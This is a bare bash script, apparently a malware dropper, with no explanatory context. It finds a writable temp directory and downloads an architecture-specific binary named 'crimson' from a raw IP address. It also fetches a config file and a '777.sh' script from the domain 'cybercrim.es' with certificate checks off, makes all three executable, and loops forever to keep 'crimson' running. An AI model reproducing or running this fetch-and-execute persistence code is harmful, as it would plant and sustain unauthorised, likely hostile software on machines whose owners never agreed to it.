#!/bin/bash

if [ -w "/dev/shm" ]; then
    DIR1="/dev/shm"
elif [ -w "/var/tmp" ]; then
    DIR1="/var/tmp"
elif [ -w "/tmp" ]; then
    DIR1="/tmp"
else
    exit 0
fi

ARM_BIN="sfe3.so"
X86_BIN="34cd.so"
ARM="http://121.127.34.102/$ARM_BIN"
X86="http://121.127.34.102/$X86_BIN"
AXAXA="https://cybercrim.es/axaxa.json"
SCRIPT777="https://cybercrim.es/777.sh"

ARCH="$(uname -m)"

download_files() {
    if [ "$ARCH" = "x86_64" ]; then
        curl -sL -o "${DIR1}/crimson" "$X86"
    elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "armv8l" ]; then
        curl -sL -o "${DIR1}/crimson" "$ARM"
    else
        echo 'not a valid arch'
        exit 1
    fi
    curl --insecure --connect-timeout 10 -sL "$AXAXA" -o "${DIR1}/axaxa.json"
    curl --insecure --connect-timeout 10 -sL "$SCRIPT777" -o "${DIR1}/777.sh"
    chmod a+x "${DIR1}/axaxa.json" "${DIR1}/crimson" "${DIR1}/777.sh"
}

while true; do
    if [ ! -f "${DIR1}/crimson" ] || [ ! -f "${DIR1}/axaxa.json" ]; then
        download_files
    fi

    if ! pgrep -f "crimson" > /dev/null; then
        cd "$DIR1" && exec ./crimson -c "$DIR1/axaxa.json"
    fi
    sleep 3
done
